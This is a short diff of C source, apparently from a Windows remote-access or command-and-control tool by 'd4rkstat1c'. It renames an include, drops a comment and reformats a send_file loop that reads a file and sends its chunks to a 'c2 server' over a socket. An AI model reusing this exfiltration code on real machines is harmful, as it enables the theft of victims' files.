@@ -1,13 +1,12 @@
 /* 
 Coded by d4rkstat1c.
 Use educationally/legally.
-#GSH ;)
 */
 #include <ws2tcpip.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
-#include "sakito_tools.h"
+#include "test.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -99,13 +98,11 @@ int send_file(const char* filename, const SOCKET connect_socket, char* const buf
 		int bytes_read;
 		while (!feof(fd) && i_result > 0) {
 			// Recursively read file until end of file (EOF).
-			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
+			if (bytes_read = fread(buf, 1, BUFLEN, fd))
 				// Send read bytes chunk to c2 server.
 				i_result = send(connect_socket, buf, bytes_read, 0);
-			}
-			else {
+			else
 				break;
-			}
 		}
 		// Close the file.
 		fclose(fd);
